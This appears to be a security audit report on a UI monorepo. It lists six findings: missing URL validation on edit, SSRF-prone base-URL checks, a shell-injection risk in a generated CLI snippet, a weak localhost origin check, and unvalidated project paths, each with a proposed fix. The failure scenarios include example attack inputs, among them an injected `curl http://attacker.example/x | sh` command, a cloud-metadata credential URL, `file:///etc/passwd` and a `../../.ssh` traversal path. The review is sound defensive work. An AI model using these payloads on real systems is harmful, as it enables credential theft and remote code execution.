**[SEVERITY: HIGH] `validateSourceDraft`'s URL-format check is wired into Add, never into Edit**
- **File:** `packages/ui-core/src/features/source-config-list/rules.ts:48-65` (`validateSourceDraft`), consumed only by `packages/ui/src/features/source-config-list/react/hooks/useSourceConfigAddForm.ts:44`; bypassed by `packages/ui/src/features/source-config-list/react/components/SourceConfigItemCard.tsx:74-77` (`saveEditing`) and `packages/ui/src/features/source-config-list/react/hooks/useSourceConfigList.ts:145-157` (`update`)
- **What is wrong:** `validateSourceDraft` is this primitive's only defense against a malformed `kind: 'url'` field (it rejects anything that isn't `http:`/`https:`). It is called exactly once in the whole feature — from the add-form hook. The edit flow on an already-persisted item (`SourceConfigItemCard`'s expand-to-edit `label`/`fields` form) calls `onUpdate({ label: editLabel, fields: editFields })` directly; `useSourceConfigList.update()` forwards that patch straight to `port.updateSource(id, patch)` with no validation call anywhere in between.
- **Failure scenario:** An MCP server (or any other `kind: 'url'` source) is added with a valid `https://` URL and passes `validateSourceDraft`. The operator later expands the card, clicks Edit, changes the URL field to `javascript:alert(1)` (or any non-http(s) string, or a value pointed at an internal host), and clicks Save. Nothing in this package rejects it — `saveEditing` → `onUpdate` → `port.updateSource(id, { fields: { url: 'javascript:alert(1)' } })` — and it persists. A host author who read this file's own doc comment ("ported from... McpClientSection.tsx's `validateRow`... must be a valid http(s) URL") would reasonably assume every `kind: 'url'` field a host receives through this shared list primitive has been validated; that assumption is false for every value that ever went through Edit rather than Add.
- **Fix:** Run `validateSourceDraft(fieldSpecs, values)` in `SourceConfigItemCard`'s edit form (block Save while invalid, mirroring `SourceConfigAddForm`'s UX), and/or have `useSourceConfigList.update()` validate a `patch.fields` payload against `fieldSpecs` before ever calling `port.updateSource`.

**[SEVERITY: HIGH] `execution`'s only base-URL guard is shape-only; this exact repo already ships the guard that's missing**
- **File:** `packages/ui-core/src/features/execution/rules.ts:27-37` (`isValidApiBaseUrl`), consumed by `missingRequiredFields` (117-118), `isProviderConfigured` (147-155), `isBaseUrlInvalid` (159-161); `packages/ui-core/src/features/execution/ports.ts:29` (`ExecutionPort.testConnection`, host-implemented, dispatches `config.baseUrl` to a live network call)
- **What is wrong:** `isValidApiBaseUrl` only checks `parsed.protocol === 'http:' || 'https:'`. It accepts loopback (`127.0.0.1`, `[::1]`), link-local/cloud-metadata (`169.254.169.254`), RFC1918 ranges, `0.0.0.0`, and userinfo-embedded lookalike hosts (`https://api.anthropic.com@169.254.169.254/` parses with `.protocol === 'https:'` and passes). Nothing here is DNS-aware. Compare `packages/agent-runtime/src/providers/connection-guard.ts` (same monorepo): it explicitly blocks loopback/RFC1918/link-local/CGNAT/metadata hosts and re-validates the DNS-resolved address (`validateBaseUrlResolved`) for the *same* BYOK-base-URL input shape. `ExecutionPort`'s doc comments give a host implementer no signal that `isValidApiBaseUrl`'s pass is insufficient — this package positions itself as "the validation layer" (see its module doc: "pure decision logic... so the React layer stays a thin renderer").
- **Failure scenario:** Anyone able to write execution settings (the operator, a synced/shared config, a compromised admin session) sets `ByokConfig.baseUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'` with any non-blank `apiKey`. `isValidApiBaseUrl` → `true`; `missingRequiredFields` → `[]`; `isProviderConfigured` → `true` — the UI shows this provider fully configured. If a host's `ExecutionPort.testConnection` (or a real dispatch) is implemented by fetching `config.baseUrl` directly — a reasonable choice for an author trusting this layer's own framing — whatever process runs that fetch (which, per this port's doc, is host/daemon-owned and may not be the browser) requests the cloud metadata endpoint, and the response can surface back through the connection-test `message` field into the settings UI.
- **Fix:** Either vendor the same private-range/metadata/DNS-aware check `connection-guard.ts` already has into `execution/rules.ts` (consistent with this package's own "vendor small generic security utilities" precedent), or explicitly document on `ExecutionPort`/`isValidApiBaseUrl` that implementers must apply their own SSRF guard before dispatching — silence today reads as "already handled."

**[SEVERITY: HIGH] `media-providers` has *no* base-URL validation at all — strictly worse than every sibling domain**
- **File:** `packages/ui-core/src/features/media-providers/rules.ts` (`resolveProviderBaseUrl:130-137`, `hasRecoverableFields:24-26`, `isEntryPresent:34-36`); `packages/ui/src/features/media-providers/react/components/MediaProvidersTab.tsx:194` (`onChange={(event) => updateProvider(option.id, { baseUrl: event.target.value })}`)
- **What is wrong:** Unlike `execution`'s `isValidApiBaseUrl` or `source-config-list`'s `isValidHttpUrl`, this file has zero URL-shape checking anywhere. `hasRecoverableFields`/`isEntryPresent` treat *any* non-empty `baseUrl` string as legitimately "configured," and `resolveProviderBaseUrl` returns whatever the operator typed, unmodified, as the "effective" URL.
- **Failure scenario:** Operator types `baseUrl: 'file:///etc/passwd'` (or an internal-network URL, or the same metadata-service address as Finding 2) into a media-provider entry alongside a real `apiKey`. `isEntryPresent`/`hasRecoverableFields` mark it configured (`sortProvidersByConfigured` ranks it first, ahead of unconfigured providers); `resolveProviderBaseUrl` hands the raw value straight through. `MediaProvidersPort.saveMediaProviders` persists `{apiKey, baseUrl}` together. If the host's real image/video-generation call is built from these two fields — the entire documented purpose of storing them together — it attaches the real API key to whatever `baseUrl` names, with not even a scheme check standing in the way.
- **Fix:** Add the equivalent of `isValidApiBaseUrl` (or the stronger guard from Finding 2) to `media-providers/rules.ts`; gate `isEntryPresent`/an `isProviderConfigured`-equivalent and `resolveProviderBaseUrl`'s "typed" branch on it; surface an inline validation error in `MediaProvidersTab.tsx` the way `execution`'s `isBaseUrlInvalid` does for its tab.

**[SEVERITY: MEDIUM] `integrations`: unescaped `serverName` spliced into a shell command and a custom-URI deeplink**
- **File:** `packages/ui-core/src/features/integrations/rules.ts:58-61` (`buildClaudeCliSnippet`), `:77-82` (`buildCursorDeeplink`)
- **What is wrong:** `buildClaudeCliSnippet` builds `` `claude mcp add-json --scope user ${serverName} '${inner}'` `` — `serverName` is concatenated into a bash command line with no quoting or escaping. `buildCursorDeeplink` builds `` `cursor://anysphere.cursor-deeplink/mcp/install?name=${serverName}&config=${encoded}` `` with `serverName` raw, not percent-encoded.
- **Failure scenario:** `types.ts`'s own doc says integrating hosts "should pass their own `serverName`" (a per-product value). A `serverName` such as `mcp-server'; curl http://attacker.example/x | sh #` produces the snippet `claude mcp add-json --scope user mcp-server'; curl http://attacker.example/x | sh #' '{"command":...}'`. `IntegrationsTab.tsx` presents this behind the instruction "Run this command in your terminal." — the explicit, intended workflow is copy-paste-execute. An operator who does exactly that runs the injected command. (Today's only in-repo caller passes the fixed constant `'acme-mcp'`/`DEFAULT_MCP_SERVER_NAME`, so this is not live in the current wiring — but the exported function itself has no guard, and the doc explicitly invites hosts to parameterize this value.)
- **Fix:** Restrict `serverName` to a safe identifier charset (e.g. `[a-zA-Z0-9_-]+`, rejecting/sanitizing otherwise) before building any snippet, or properly shell-single-quote it (`'` → `'\''`) in `buildClaudeCliSnippet`, and `encodeURIComponent(serverName)` in `buildCursorDeeplink`.

**[SEVERITY: MEDIUM] `isTrustedConnectorCallbackOrigin` trusts any port on localhost**
- **File:** `packages/ui-core/src/features/connectors/rules.ts:326-340`; consumed by `packages/ui/src/features/connectors/dependencies.ts:110-122` (`createBrowserConnectorAuthBridge`)
- **What is wrong:** The function accepts any `http:`/`https:` origin whose hostname is `localhost`/`127.0.0.1`/`[::1]`/`::1`, regardless of port, as a trusted sender for the OAuth-completion `postMessage`.
- **Failure scenario:** Any other local process with a web-facing origin (a dev server on a different port, another Electron app, local malware) can `postMessage({type: 'jini:connector-connected'})` to the Jini window and pass this check. Impact today is bounded — `useConnectorAuthorization.ts:148` only uses the trusted callback to trigger `reloadStatuses()`, which re-fetches truth from `port.fetchConnectorStatuses()` and trusts no data from the message itself — so this is a real but currently low-impact origin-check weakening, not a full auth bypass. It becomes a bigger problem the moment a future caller wires more of the message payload through.
- **Fix:** Track the specific origin the popup/redirect was opened with (or a per-flow nonce) rather than accepting any port on localhost.

**[SEVERITY: MEDIUM] `project-locations`: no path-shape validation, and the requirement is undocumented**
- **File:** `packages/ui-core/src/features/project-locations/rules.ts:45-47` (`saveableDrafts`), `:78-96` (`isDuplicatePath`); `packages/ui-core/src/features/project-locations/ports.ts` (`ProjectLocationsPort.saveLocations`)
- **What is wrong:** `ProjectLocationDraft.path` is handled as an opaque string. `saveableDrafts` only checks it's non-blank; `isDuplicatePath`'s normalization only strips a trailing separator. Nothing here (or in `ports.ts`'s docs) requires — or even states that a host must ensure — the path is absolute, resolved, and free of `..` traversal, even though these locations become filesystem roots a host later scans/grants agent access to (`scanLocations` "imports any existing projects found under the host's configured roots").
- **Failure scenario:** A host pairs the native folder picker with a free-text path field (a natural UI choice this library doesn't discourage) or accepts these drafts from a synced config. A relative/traversal path like `../../.ssh` passes every check in this file and is persisted via `saveLocations` as a legitimate project root with no complaint at any point in this layer.
- **Fix:** Add an `isValidProjectLocationPath`-style rule (reject non-absolute paths and `..` segments) and call it from `saveableDrafts`; document the absolute-and-resolved requirement on `ProjectLocationsPort.saveLocations`. Per the packet's own caveat, `project-locations` is library code not currently mounted by a host — this is reported purely as a contract gap for whichever host does wire it up, not as a live exploit.
